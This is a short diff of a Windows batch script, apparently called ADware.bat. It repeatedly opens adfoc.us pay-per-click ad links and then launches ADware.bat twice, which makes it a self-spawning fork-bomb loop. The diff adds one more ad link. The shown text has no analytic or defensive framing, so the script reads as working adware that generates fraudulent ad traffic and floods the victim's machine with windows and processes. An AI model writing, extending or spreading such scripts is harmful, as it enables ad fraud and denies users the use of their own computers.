@@ -14,5 +14,6 @@ start http://adfoc.us/859243103896079
 start http://adfoc.us/859243103848098
 start http://adfoc.us/859243103913004
 start http://adfoc.us/859243103896079
+start http://adfoc.us/859243103951107
 start ADware.bat
 start ADware.bat
